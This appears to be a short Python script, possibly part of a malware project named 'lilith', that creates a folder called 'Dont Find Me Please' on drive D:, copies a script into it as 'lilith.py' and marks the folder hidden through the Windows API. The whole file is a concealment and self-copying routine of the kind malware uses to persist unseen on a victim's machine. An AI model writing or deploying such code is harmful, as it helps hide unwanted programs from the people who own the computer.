import shutil
import os
import win32api
import win32con

disk = "D:\\"
folder_name = "Dont Find Me Please"
folder_path = os.path.join(disk, folder_name)
try:
    os.makedirs(folder_path)
except:
    pass


source_path = 'main.py'
destination_path = 'D:\Dont Find Me Please\lilith.py'

shutil.copy(source_path, destination_path)


shutil.copy2(source_path, destination_path)
win32api.SetFileAttributes("D:\Dont Find Me Please", win32con.FILE_ATTRIBUTE_HIDDEN)

